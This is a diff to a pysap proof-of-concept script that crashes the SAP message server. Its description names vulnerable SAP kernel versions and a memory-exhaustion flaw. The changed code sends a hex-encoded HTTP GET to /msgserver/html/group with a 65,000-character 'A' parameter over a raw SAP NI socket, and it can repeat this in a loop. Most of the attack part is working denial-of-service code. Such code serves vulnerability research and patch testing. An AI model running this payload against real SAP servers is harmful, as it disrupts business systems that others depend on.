@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# coding=utf-8
 # ===========
 # pysap - Python library for crafting SAP's network protocols packets
 #
@@ -20,6 +21,8 @@
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 # GNU General Public License for more details.
 # ==============
+
+
 
 """
 Vulnerable SAP Kernel versions
@@ -43,8 +46,8 @@ SAP KERNEL 7.45 64-BIT UNICODE
 SAP KERNEL 7.49 64-BIT UNICODE
 
 TECHNICAL DESCRIPTION
-The message server doesn’t free properly the resources allocation for handling the clients 
-request in the case where the requests size is between 4k and 65k. In this special case, 
+The message server doesn’t free properly the resources allocation for handling the clients
+request in the case where the requests size is between 4k and 65k. In this special case,
 the server answers with an empty reply as opposed to the case where the request is greater
 than 65k, then the server will reset the connection. The following shows log of the msgserver
 process being killed because of too much memory allocated:
@@ -59,11 +62,10 @@ from time import sleep
 from socket import error as SocketError
 from optparse import OptionParser, OptionGroup
 # External imports
-from scapy.packet import Raw
 from scapy.config import conf
-import requests
 # Custom imports
 import pysap
+from pysap.SAPRouter import SAPRoutedStreamSocket
 
 
 # Set the verbosity to 0
@@ -119,10 +121,8 @@ def send_crash(host, port, item, verbose, route=None):
     if verbose:
         print("[*] Sending crash")
     # Initiate the connection
-    try:
-        requests.get(host+":"+str(port)+item)
-    except:
-        pass
+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)
+    conn.send(item)
 
 # Main function
 def main():
@@ -136,8 +136,8 @@ def main():
 
     # Crafting the item
 
-    item = "/msgserver/html/group?group="+'A'*65000
-
+    item = "\x47\x45\x54\x20\x2f\x6d\x73\x67\x73\x65\x72\x76\x65\x72\x2f\x68\x74\x6d\x6c\x2f\x67\x72\x6f\x75\x70\x3f\x67\x72\x6f\x75\x70\x3d" + "\x41" * 65000 + "\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0a\x0a"
+    options.route_ni_version=0
     try:
         if options.loop:
             try:
